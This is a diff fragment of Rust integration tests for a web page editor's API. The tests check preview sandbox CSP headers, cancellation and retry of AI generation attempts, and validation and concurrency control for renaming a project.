+    .unwrap();
+    let harness = Harness::with_import(source).await;
+    let import_preview = response_json(
+        harness
+            .post("/api/v1/imports/previews", json!({"schemaVersion":"1"}))
+            .await,
+    )
+    .await;
+    let confirmed = harness
+        .post(
+            &format!(
+                "/api/v1/imports/{}/confirm",
+                string_at(&import_preview, "/importPreview/id")
+            ),
+            json!({
+                "schemaVersion":"1",
+                "expectedManifestSha256":string_at(&import_preview, "/importPreview/manifestSha256")
+            }),
+        )
+        .await;
+    assert_eq!(confirmed.status(), StatusCode::CREATED);
+    let confirmed = response_json(confirmed).await;
+    let preview_url = string_at(&confirmed, "/project/previewUrl");
+    let host = preview_host(&preview_url).to_owned();
+    let base_path = preview_path(&preview_url).to_owned();
+
+    for file in ["active.svg", "active.xml"] {
+        let response = preview_router(harness.state.clone())
+            .oneshot(
+                Request::builder()
+                    .uri(format!("{base_path}{file}"))
+                    .header(HOST, &host)
+                    .header("sec-fetch-mode", "navigate")
+                    .header("sec-fetch-dest", "iframe")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(response.status(), StatusCode::OK);
+        assert_eq!(
+            response.headers().get(CONTENT_TYPE).unwrap(),
+            "text/plain; charset=utf-8"
+        );
+        let csp = response
+            .headers()
+            .get("content-security-policy")
+            .unwrap()
+            .to_str()
+            .unwrap();
+        for required in [
+            "sandbox",
+            "default-src 'none'",
+            "script-src 'none'",
+            "script-src-elem 'none'",
+            "script-src-attr 'none'",
+            "connect-src 'none'",
+            "form-action 'none'",
+            "navigate-to 'none'",
+            "frame-ancestors 'none'",
+        ] {
+            assert!(
+                csp.contains(required),
+                "{file} CSP omitted {required}: {csp}"
+            );
+        }
+        assert!(!csp.contains("nonce-"));
+    }
+
+    let image = preview_router(harness.state.clone())
+        .oneshot(
+            Request::builder()
+                .uri(format!("{base_path}active.svg"))
+                .header(HOST, &host)
+                .header("sec-fetch-mode", "no-cors")
+                .header("sec-fetch-dest", "image")
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(image.status(), StatusCode::OK);
+    assert_eq!(image.headers().get(CONTENT_TYPE).unwrap(), "image/svg+xml");
+    assert_eq!(
+        image.headers().get("content-security-policy").unwrap(),
+        PREVIEW_NON_HTML_CSP
+    );
+
+    let html = preview_router(harness.state.clone())
+        .oneshot(
+            Request::builder()
+                .uri(base_path)
+                .header(HOST, host)
+                .header("sec-fetch-mode", "navigate")
+                .header("sec-fetch-dest", "iframe")
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    let html_csp = html
+        .headers()
+        .get("content-security-policy")
+        .unwrap()
+        .to_str()
+        .unwrap();
+    assert!(html_csp.contains("sandbox allow-scripts allow-same-origin"));
+    assert!(html_csp.contains("navigate-to 'self'"));
+    assert!(html_csp.contains("script-src 'self' 'nonce-"));
 }
 
 #[tokio::test]
@@ -2316,58 +4275,568 @@ fn approval_is_hashed_bound_expiring_and_atomically_one_shot() {
 
 #[test]
 fn active_attempt_claim_rejects_without_overwriting_the_in_flight_attempt() {
-    let mut active_attempts = HashMap::new();
-    claim_ai_attempt(&mut active_attempts, "prj_one", "attempt-one").unwrap();
+    let mut ai_attempts = AiAttempts::default();
+    claim_ai_attempt(&mut ai_attempts, "prj_one", "attempt-one").unwrap();
 
-    let error = claim_ai_attempt(&mut active_attempts, "prj_one", "attempt-two").unwrap_err();
+    let error = claim_ai_attempt(&mut ai_attempts, "prj_one", "attempt-two").unwrap_err();
 
     assert_eq!(error.status, StatusCode::CONFLICT);
     assert_eq!(error.code, "ai_attempt_in_progress");
     assert_eq!(
-        active_attempts.get("prj_one").map(String::as_str),
-        Some("attempt-one")
+        ai_attempts.status("prj_one", "attempt-one"),
+        Some(AttemptStatus::Running)
     );
 }
 
 #[tokio::test]
 async fn active_attempt_guard_releases_cancelled_attempt_without_touching_a_later_one() {
     let harness = Harness::new().await;
-    {
+    let first_generation = {
         let mut store = harness.state.store().unwrap();
-        claim_ai_attempt(&mut store.active_attempts, "prj_one", "attempt-one").unwrap();
-    }
+        claim_ai_attempt(&mut store.ai_attempts, "prj_one", "attempt-one")
+            .unwrap()
+            .generation()
+    };
     drop(ActiveAttemptGuard::new(
         harness.state.clone(),
         "prj_one",
         "attempt-one",
+        first_generation,
     ));
     assert!(
         !harness
             .state
             .store()
             .unwrap()
-            .active_attempts
-            .contains_key("prj_one")
+            .ai_attempts
+            .contains_project("prj_one")
     );
 
-    {
+    let _second_generation = {
         let mut store = harness.state.store().unwrap();
-        claim_ai_attempt(&mut store.active_attempts, "prj_one", "attempt-two").unwrap();
-    }
+        claim_ai_attempt(&mut store.ai_attempts, "prj_one", "attempt-two")
+            .unwrap()
+            .generation()
+    };
     drop(ActiveAttemptGuard::new(
         harness.state.clone(),
         "prj_one",
         "attempt-one",
+        first_generation,
     ));
     assert_eq!(
         harness
             .state
             .store()
             .unwrap()
-            .active_attempts
-            .get("prj_one")
-            .map(String::as_str),
-        Some("attempt-two")
+            .ai_attempts
+            .status("prj_one", "attempt-two"),
+        Some(AttemptStatus::Running)
+    );
+}
+
+#[tokio::test]
+async fn stale_attempt_guard_generation_cannot_touch_reused_id_after_terminal_eviction() {
+    let harness = Harness::new().await;
+    let project_id = "prj_generation_guard";
+    let attempt_id = "attempt-generation-reuse";
+    let (stale_generation, stale_release_guard) = {
+        let mut store = harness.state.store().unwrap();
+        let cancellation =
+            claim_ai_attempt(&mut store.ai_attempts, project_id, attempt_id).unwrap();
+        let generation = cancellation.generation();
+        let guard =
+            ActiveAttemptGuard::new(harness.state.clone(), project_id, attempt_id, generation);
+        assert_eq!(
+            store.ai_attempts.cancel(project_id, attempt_id),
+            CancelResult::Cancelled
+        );
+        (generation, guard)
+    };
+
+    let current_generation = {
+        let mut store = harness.state.store().unwrap();
+        for index in 0..crate::ai_attempt::MAX_TERMINAL_ATTEMPTS {
+            let filler_id = format!("attempt-generation-filler-{index}");
+            let filler = store
+                .ai_attempts
+                .claim("prj_generation_filler", &filler_id)
+                .unwrap();
+            assert_eq!(
+                store.ai_attempts.complete(
+                    "prj_generation_filler",
+                    &filler_id,
+                    filler.generation(),
+                    AttemptStatus::ProviderFailed,
+                ),
+                CompleteResult::Recorded
+            );
+        }
+        assert_eq!(store.ai_attempts.status(project_id, attempt_id), None);
+        claim_ai_attempt(&mut store.ai_attempts, project_id, attempt_id)
+            .unwrap()
+            .generation()
+    };
+    assert_ne!(stale_generation, current_generation);
+
+    drop(stale_release_guard);
+    assert_eq!(
+        harness
+            .state
+            .store()
+            .unwrap()
+            .ai_attempts
+            .status(project_id, attempt_id),
+        Some(AttemptStatus::Running)
+    );
+
+    let mut stale_complete_guard = ActiveAttemptGuard::new(
+        harness.state.clone(),
+        project_id,
+        attempt_id,
+        stale_generation,
+    );
+    {
+        let mut store = harness.state.store().unwrap();
+        let error = stale_complete_guard
+            .complete(&mut store.ai_attempts, AttemptStatus::ProviderFailed)
+            .unwrap_err();
+        assert_eq!(error.code, "ai_attempt_not_active");
+        assert_eq!(
+            store.ai_attempts.status(project_id, attempt_id),
+            Some(AttemptStatus::Running)
+        );
+        assert!(
+            store
+                .ai_attempts
+                .release(project_id, attempt_id, current_generation)
+        );
+    }
+}
+
+#[tokio::test]
+async fn semantic_ai_cancel_is_idempotent_and_late_provider_completion_never_promotes() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let harness = Harness::new().await;
+    let project = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&project, "/project/id");
+    let revision_id = string_at(&project, "/project/revisionId");
+    let target = response_json(
+        harness
+            .post(
+                &format!("/api/v1/projects/{project_id}/targets"),
+                element_target_request(&revision_id, 601, "hero-heading"),
+            )
+            .await,
+    )
+    .await;
+    let cancelled_attempt_id = "attempt-cancel-race-canary";
+    let mut first_context_request =
+        context_request(&revision_id, &target, "見出しを変更してください。");
+    first_context_request["attemptId"] = json!(cancelled_attempt_id);
+    let first_context = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/contexts"),
+            first_context_request,
+        )
+        .await;
+    assert_eq!(first_context.status(), StatusCode::CREATED);
+    let first_context = response_json(first_context).await;
+
+    let pending = ai_provider::testing::PendingProvider::install(cancelled_attempt_id).await;
+    let proposal_task = tokio::spawn({
+        let state = harness.state.clone();
+        let token = harness.token.clone();
+        let uri = format!("/api/v1/projects/{project_id}/proposals");
+        let payload = json!({
+            "schemaVersion":"1",
+            "contextId":string_at(&first_context, "/context/id"),
+            "contextSha256":string_at(&first_context, "/context/sha256")
+        });
+        async move { post_for(&state, &token, &uri, payload).await }
+    });
+    pending.wait_until_entered().await;
+
+    let status_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{cancelled_attempt_id}");
+    let running = harness.get(&status_uri).await;
+    assert_eq!(running.status(), StatusCode::OK);
+    assert_eq!(
+        response_json(running).await,
+        json!({
+            "schemaVersion":"1",
+            "attemptId":cancelled_attempt_id,
+            "status":"running"
+        })
+    );
+
+    let malformed_cancel_canary = "PRIVATE-CANCEL-DETAIL-CANARY";
+    let malformed_cancel = harness
+        .post(
+            &format!("{status_uri}/cancel"),
+            json!({"schemaVersion":"1","reason":malformed_cancel_canary}),
+        )
+        .await;
+    assert_eq!(malformed_cancel.status(), StatusCode::BAD_REQUEST);
+    assert!(
+        !serde_json::to_string(&response_json(malformed_cancel).await)
+            .unwrap()
+            .contains(malformed_cancel_canary)
+    );
+
+    let cancelled = harness
+        .post(
+            &format!("{status_uri}/cancel"),
+            json!({"schemaVersion":"1"}),
+        )
+        .await;
+    assert_eq!(cancelled.status(), StatusCode::OK);
+    let cancelled_body = json!({
+        "schemaVersion":"1",
+        "attemptId":cancelled_attempt_id,
+        "status":"cancelled"
+    });
+    assert_eq!(response_json(cancelled).await, cancelled_body);
+
+    let replay = harness
+        .post(
+            &format!("{status_uri}/cancel"),
+            json!({"schemaVersion":"1"}),
+        )
+        .await;
+    assert_eq!(replay.status(), StatusCode::OK);
+    assert_eq!(response_json(replay).await, cancelled_body);
+    assert_eq!(
+        response_json(harness.get(&status_uri).await).await,
+        cancelled_body
+    );
+
+    let cancelled_proposal = tokio::time::timeout(std::time::Duration::from_secs(5), proposal_task)
+        .await
+        .expect("cancelled proposal request completed")
+        .expect("proposal task");
+    assert_eq!(cancelled_proposal.status(), StatusCode::CONFLICT);
+    assert_eq!(
+        response_json(cancelled_proposal).await["error"]["code"],
+        "ai_attempt_cancelled"
+    );
+
+    pending.release();
+    pending.wait_until_completed().await;
+    {
+        let store = harness.state.store().unwrap();
+        assert!(
+            store
+                .projects
+                .get(&project_id)
+                .is_some_and(|project| project.proposal.is_none())
+        );
+        assert_eq!(
+            store.ai_attempts.status(&project_id, cancelled_attempt_id),
+            Some(AttemptStatus::Cancelled)
+        );
+    }
+
+    let same_attempt_retry = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/proposals"),
+            json!({
+                "schemaVersion":"1",
+                "contextId":string_at(&first_context, "/context/id"),
+                "contextSha256":string_at(&first_context, "/context/sha256")
+            }),
+        )
+        .await;
+    assert_eq!(same_attempt_retry.status(), StatusCode::CONFLICT);
+    assert_eq!(
+        response_json(same_attempt_retry).await["error"]["code"],
+        "ai_attempt_already_finished"
+    );
+
+    let new_attempt_id = "attempt-after-explicit-cancel";
+    let mut next_context_request =
+        context_request(&revision_id, &target, "見出しを変更してください。");
+    next_context_request["attemptId"] = json!(new_attempt_id);
+    let next_context = response_json(
+        harness
+            .post(
+                &format!("/api/v1/projects/{project_id}/contexts"),
+                next_context_request,
+            )
+            .await,
+    )
+    .await;
+    let new_proposal = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/proposals"),
+            json!({
+                "schemaVersion":"1",
+                "contextId":string_at(&next_context, "/context/id"),
+                "contextSha256":string_at(&next_context, "/context/sha256")
+            }),
+        )
+        .await;
+    assert_eq!(new_proposal.status(), StatusCode::CREATED);
+    let ready_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{new_attempt_id}");
+    assert_eq!(
+        response_json(harness.get(&ready_uri).await).await,
+        json!({
+            "schemaVersion":"1",
+            "attemptId":new_attempt_id,
+            "status":"proposal_ready"
+        })
+    );
+}
+
+#[tokio::test]
+async fn dropped_proposal_request_is_not_semantic_cancel_and_same_attempt_can_retry() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let harness = Harness::new().await;
+    let project = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&project, "/project/id");
+    let revision_id = string_at(&project, "/project/revisionId");
+    let target = response_json(
+        harness
+            .post(
+                &format!("/api/v1/projects/{project_id}/targets"),
+                element_target_request(&revision_id, 603, "hero-heading"),
+            )
+            .await,
+    )
+    .await;
+    let attempt_id = "attempt-http-future-drop";
+    let mut context_payload = context_request(&revision_id, &target, "見出しを変更してください。");
+    context_payload["attemptId"] = json!(attempt_id);
+    let context = response_json(
+        harness
+            .post(
+                &format!("/api/v1/projects/{project_id}/contexts"),
+                context_payload,
+            )
+            .await,
+    )
+    .await;
+    let proposal_payload = json!({
+        "schemaVersion":"1",
+        "contextId":string_at(&context, "/context/id"),
+        "contextSha256":string_at(&context, "/context/sha256")
+    });
+    let pending = ai_provider::testing::PendingProvider::install(attempt_id).await;
+    let proposal_task = tokio::spawn({
+        let state = harness.state.clone();
+        let token = harness.token.clone();
+        let uri = format!("/api/v1/projects/{project_id}/proposals");
+        let payload = proposal_payload.clone();
+        async move { post_for(&state, &token, &uri, payload).await }
+    });
+    pending.wait_until_entered().await;
+    proposal_task.abort();
+    assert!(proposal_task.await.unwrap_err().is_cancelled());
+    pending.release();
+    pending.wait_until_completed().await;
+
+    let status_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{attempt_id}");
+    assert_eq!(
+        response_json(harness.get(&status_uri).await).await["status"],
+        "queued"
+    );
+    let retried = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/proposals"),
+            proposal_payload,
+        )
+        .await;
+    assert_eq!(retried.status(), StatusCode::CREATED);
+    assert_eq!(
+        response_json(harness.get(&status_uri).await).await["status"],
+        "proposal_ready"
+    );
+}
+
+#[tokio::test]
+async fn ai_attempt_routes_require_auth_exact_ids_and_project_binding() {
+    let harness = Harness::new().await;
+    let first_project = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let second_project = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let first_project_id = string_at(&first_project, "/project/id");
+    let second_project_id = string_at(&second_project, "/project/id");
+    let attempt_id = "attempt-project-bound";
+    {
+        let mut store = harness.state.store().unwrap();
+        let _ = store
+            .ai_attempts
+            .claim(&first_project_id, attempt_id)
+            .unwrap();
+    }
+    let status_uri = format!("/api/v1/projects/{first_project_id}/ai-attempts/{attempt_id}");
+
+    let unauthenticated = editor_router(harness.state.clone())
+        .oneshot(
+            Request::builder()
+                .uri(&status_uri)
+                .header(HOST, EDITOR_HOST)
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(unauthenticated.status(), StatusCode::UNAUTHORIZED);
+
+    let cross_project = harness
+        .get(&format!(
+            "/api/v1/projects/{second_project_id}/ai-attempts/{attempt_id}"
+        ))
+        .await;
+    assert_eq!(cross_project.status(), StatusCode::NOT_FOUND);
+
+    let invalid_project_canary = "project~PRIVATE-PATH-CANARY";
+    let invalid_project = harness
+        .get(&format!(
+            "/api/v1/projects/{invalid_project_canary}/ai-attempts/{attempt_id}"
+        ))
+        .await;
+    assert_eq!(invalid_project.status(), StatusCode::BAD_REQUEST);
+    assert!(
+        !serde_json::to_string(&response_json(invalid_project).await)
+            .unwrap()
+            .contains(invalid_project_canary)
+    );
+
+    let invalid_attempt_canary = "attempt~PRIVATE-PATH-CANARY";
+    let invalid_attempt = harness
+        .get(&format!(
+            "/api/v1/projects/{first_project_id}/ai-attempts/{invalid_attempt_canary}"
+        ))
+        .await;
+    assert_eq!(invalid_attempt.status(), StatusCode::BAD_REQUEST);
+    assert!(
+        !serde_json::to_string(&response_json(invalid_attempt).await)
+            .unwrap()
+            .contains(invalid_attempt_canary)
+    );
+
+    let wrong_project_cancel = harness
+        .post(
+            &format!("/api/v1/projects/{second_project_id}/ai-attempts/{attempt_id}/cancel"),
+            json!({"schemaVersion":"1"}),
+        )
+        .await;
+    assert_eq!(wrong_project_cancel.status(), StatusCode::NOT_FOUND);
+    assert_eq!(
+        response_json(harness.get(&status_uri).await).await["status"],
+        "running"
+    );
+
+    let cancelled = harness
+        .post(
+            &format!("{status_uri}/cancel"),
+            json!({"schemaVersion":"1"}),
+        )
+        .await;
+    assert_eq!(cancelled.status(), StatusCode::OK);
+}
+
+#[tokio::test]
+async fn cancel_before_provider_claim_tombstones_the_queued_context_attempt() {
+    let harness = Harness::new().await;
+    let project = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&project, "/project/id");
+    let revision_id = string_at(&project, "/project/revisionId");
+    let target = response_json(
+        harness
+            .post(
+                &format!("/api/v1/projects/{project_id}/targets"),
+                element_target_request(&revision_id, 602, "hero-heading"),
+            )
+            .await,
+    )
+    .await;
+    let attempt_id = "attempt-cancel-before-claim";
+    let mut context_payload = context_request(&revision_id, &target, "見出しを変更してください。");
+    context_payload["attemptId"] = json!(attempt_id);
+    let context = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/contexts"),
+            context_payload,
+        )
+        .await;
+    assert_eq!(context.status(), StatusCode::CREATED);
+    let context = response_json(context).await;
+    let status_uri = format!("/api/v1/projects/{project_id}/ai-attempts/{attempt_id}");
+    assert_eq!(
+        response_json(harness.get(&status_uri).await).await,
+        json!({"schemaVersion":"1","attemptId":attempt_id,"status":"queued"})
+    );
+
+    let cancelled = harness
+        .post(
+            &format!("{status_uri}/cancel"),
+            json!({"schemaVersion":"1"}),
+        )
+        .await;
+    assert_eq!(cancelled.status(), StatusCode::OK);
+    assert_eq!(response_json(cancelled).await["status"], "cancelled");
+
+    let proposal = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/proposals"),
+            json!({
+                "schemaVersion":"1",
+                "contextId":string_at(&context, "/context/id"),
+                "contextSha256":string_at(&context, "/context/sha256")
+            }),
+        )
+        .await;
+    assert_eq!(proposal.status(), StatusCode::CONFLICT);
+    assert_eq!(
+        response_json(proposal).await["error"]["code"],
+        "ai_attempt_already_finished"
+    );
+    let store = harness.state.store().unwrap();
+    assert!(
+        store
+            .projects
+            .get(&project_id)
+            .is_some_and(|project| project.proposal.is_none())
     );
 }
 
@@ -2563,7 +5032,7 @@ async fn redacted_site_context_is_reviewable_but_generation_fails_before_provide
     );
     assert!(!serde_json::to_string(&proposal).unwrap().contains(secret));
     let store = harness.state.store().unwrap();
-    assert!(!store.active_attempts.contains_key(&project_id));
+    assert!(!store.ai_attempts.contains_project(&project_id));
     assert!(
         store
             .projects
@@ -2764,6 +5233,17 @@ fn preview_bridge_is_response_only_first_script_and_privacy_safe_before_handshak
     assert!(injected.contains("Object.defineProperty(owner,name"));
     assert!(injected.contains("RTCPeerConnection"));
     assert!(injected.contains("function previewTargetRuntime"));
+    assert!(injected.contains("const maximumScannedElements = 10_000"));
+    assert!(injected.contains("createTreeWalker(root, NodeFilter.SHOW_ELEMENT)"));
+    assert!(injected.contains("visited < maximumScannedElements"));
+    assert!(injected.contains("boundedMatches(blockSelector, 512)"));
+    assert!(injected.contains("scheduleRegionOverlay"));
+    assert!(injected.contains("requestFrame(() =>"));
+    assert!(injected.contains("addEventListener(\"scroll\", scheduleRememberedOverlay"));
+    assert!(injected.contains("new ResizeObserver"));
+    assert!(injected.contains("new MutationObserver"));
+    assert!(!injected.contains("document.querySelectorAll(blockSelector)"));
+    assert!(!injected.contains("document.querySelectorAll(\"h1,h2,h3,p,a,button,img\")"));
     assert!(injected.contains(",\"docs/index.html\");</script>"));
     assert!(
         injected.contains("\n}))(") && !injected.contains("\n});)("),
@@ -2911,6 +5391,10 @@ async fn assert_uniform_preview_not_found(response: Response) {
         "off"
     );
     assert!(response.headers().contains_key("permissions-policy"));
+    assert_eq!(
+        response.headers().get("content-security-policy").unwrap(),
+        PREVIEW_NON_HTML_CSP
+    );
     assert_eq!(response_bytes(response).await, b"Not found");
 }
 
@@ -2964,4 +5448,171 @@ fn source_fingerprint(root: &std::path::Path) -> BTreeMap<String, Vec<u8>> {
     let mut output = BTreeMap::new();
     visit(root, root, &mut output);
     output
+}
+
+#[tokio::test]
+async fn project_display_name_patch_is_cas_idempotent_and_restart_durable() {
+    let harness = Harness::new().await;
+    let created = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&created, "/project/id");
+    let original = created["project"].clone();
+    let route = format!("/api/v1/projects/{project_id}");
+    let request = json!({
+        "schemaVersion":"1",
+        "expectedDisplayName":"Untitled landing page",
+        "displayName":"Campaign LP"
+    });
+
+    let updated = harness.patch(&route, request.clone()).await;
+    assert_eq!(updated.status(), StatusCode::OK);
+    let updated = response_json(updated).await;
+    assert_eq!(updated["project"]["displayName"], "Campaign LP");
+    for field in [
+        "id",
+        "revisionId",
+        "acceptedManifestSha256",
+        "status",
+        "files",
+        "activeReview",
+        "history",
+    ] {
+        assert_eq!(updated["project"][field], original[field], "field {field}");
+    }
+
+    let retry = harness.patch(&route, request).await;
+    assert_eq!(retry.status(), StatusCode::OK);
+    assert_eq!(
+        response_json(retry).await["project"]["displayName"],
+        "Campaign LP"
+    );
+    let stale = harness
+        .patch(
+            &route,
+            json!({
+                "schemaVersion":"1",
+                "expectedDisplayName":"Untitled landing page",
+                "displayName":"Stale overwrite"
+            }),
+        )
+        .await;
+    assert_eq!(stale.status(), StatusCode::CONFLICT);
+    assert_eq!(
+        response_json(stale).await["error"]["code"],
+        "project_display_name_changed"
+    );
+
+    let harness = harness.restart().await;
+    let reopened = response_json(harness.get(&route).await).await;
+    assert_eq!(reopened["project"]["displayName"], "Campaign LP");
+    for field in ["id", "revisionId", "acceptedManifestSha256", "files"] {
+        assert_eq!(reopened["project"][field], original[field], "field {field}");
+    }
+}
+
+#[tokio::test]
+async fn project_display_name_boundaries_and_mutation_authority_fail_closed() {
+    let harness = Harness::new().await;
+    let created = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&created, "/project/id");
+    let route = format!("/api/v1/projects/{project_id}");
+    let valid_boundary = "🚀".repeat(256);
+    let accepted = harness
+        .patch(
+            &route,
+            json!({
+                "schemaVersion":"1",
+                "expectedDisplayName":"Untitled landing page",
+                "displayName":valid_boundary
+            }),
+        )
+        .await;
+    assert_eq!(accepted.status(), StatusCode::OK);
+
+    for invalid in [
+        " ".to_owned(),
+        "line\nbreak".to_owned(),
+        "/home/private/project".to_owned(),
+        "C:\\private\\project".to_owned(),
+        "e\u{301}".to_owned(),
+        "x".repeat(257),
+        "🚀".repeat(257),
+    ] {
+        let response = harness
+            .patch(
+                &route,
+                json!({
+                    "schemaVersion":"1",
+                    "expectedDisplayName":valid_boundary,
+                    "displayName":invalid
+                }),
+            )
+            .await;
+        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+        assert_eq!(
+            response_json(response).await["error"]["code"],
+            "invalid_request"
+        );
+    }
+    let extra = harness
+        .patch(
+            &route,
+            json!({
+                "schemaVersion":"1",
+                "expectedDisplayName":valid_boundary,
+                "displayName":"Exact keys only",
+                "extra":true
+            }),
+        )
+        .await;
+    assert_eq!(extra.status(), StatusCode::BAD_REQUEST);
+
+    let payload = json!({
+        "schemaVersion":"1",
+        "expectedDisplayName":valid_boundary,
+        "displayName":"Authority boundary"
+    });
+    let token_header = format!("Bearer {}", harness.token);
+    let standard = [
+        ("host", EDITOR_HOST),
+        ("origin", EDITOR_ORIGIN),
+        ("sec-fetch-site", "same-origin"),
+        ("content-type", "application/json"),
+        ("authorization", token_header.as_str()),
+    ];
+    for (omitted, expected_status) in [
+        ("host", StatusCode::FORBIDDEN),
+        ("origin", StatusCode::FORBIDDEN),
+        ("sec-fetch-site", StatusCode::FORBIDDEN),
+        ("content-type", StatusCode::UNSUPPORTED_MEDIA_TYPE),
+        ("authorization", StatusCode::UNAUTHORIZED),
+    ] {
+        let headers = standard
+            .iter()
+            .copied()
+            .filter(|(name, _)| *name != omitted)
+            .collect::<Vec<_>>();
+        assert_eq!(
+            raw_patch_for(&harness.state, &route, &payload, &headers)
+                .await
+                .status(),
+            expected_status,
+            "omitted {omitted}"
+        );
+    }
 }
